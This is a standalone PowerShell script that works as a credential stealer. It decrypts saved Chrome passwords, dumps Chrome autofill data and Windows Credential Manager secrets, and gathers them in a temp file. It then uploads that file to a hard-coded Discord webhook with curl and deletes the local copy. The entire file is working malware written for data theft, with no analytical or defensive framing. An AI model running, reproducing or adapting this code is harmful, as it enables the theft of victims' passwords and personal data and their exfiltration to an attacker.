# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    try {
        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
        $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
        $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()

        $passwords = @()
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = $reader["password_value"]
            $iv = $encryptedPassword[3..14]
            $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
            $cipher = [System.Security.Cryptography.AesGcm]::new($key)
            $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
            $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
        }
        $dbConnection.Close()
        return $passwords
    } catch {
        Write-Error "Failed to get Chrome passwords: $_"
        return @()
    }
}

# Function to get Chrome autofill data
function Get-ChromeAutofill {
    try {
        $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
        $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
        $dbConnection.Open()
        $cmd = $dbConnection.CreateCommand()
        $cmd.CommandText = "SELECT name, value FROM autofill"
        $reader = $cmd.ExecuteReader()

        $autofillData = @()
        while ($reader.Read()) {
            $name = $reader["name"]
            $value = $reader["value"]
            $autofillData += [pscustomobject]@{Name = $name; Value = $value}
        }
        $dbConnection.Close()
        return $autofillData
    } catch {
        Write-Error "Failed to get Chrome autofill data: $_"
        return @()
    }
}

# Function to get Credential Manager passwords
function Get-CredentialManagerPasswords {
    try {
        $credentials = Get-StoredCredential -Type Generic | Where-Object { $_.TargetName -like "LegacyGeneric:target=" }
        $result = @()
        foreach ($credential in $credentials) {
            $result += [pscustomobject]@{
                Target = $credential.TargetName
                Username = $credential.UserName
                Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password))
            }
        }
        return $result
    } catch {
        Write-Error "Failed to get Credential Manager passwords: $_"
        return @()
    }
}

# Combine results and save to file
$chromePasswords = Get-ChromePasswords
$chromeAutofill = Get-ChromeAutofill
$credentialManagerPasswords = Get-CredentialManagerPasswords

$outputPath = "$env:TEMP\credentials.txt"
if ($chromePasswords.Count -gt 0) {
    $chromePasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Chrome passwords found."
}

if ($chromeAutofill.Count -gt 0) {
    $chromeAutofill | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Chrome autofill data found."
}

if ($credentialManagerPasswords.Count -gt 0) {
    $credentialManagerPasswords | Out-File -FilePath $outputPath -Append
} else {
    Add-Content -Path $outputPath -Value "No Credential Manager passwords found."
}

# Upload to Discord
$webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
$curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
Invoke-Expression -Command $curlCmd

Remove-Item -Path $outputPath
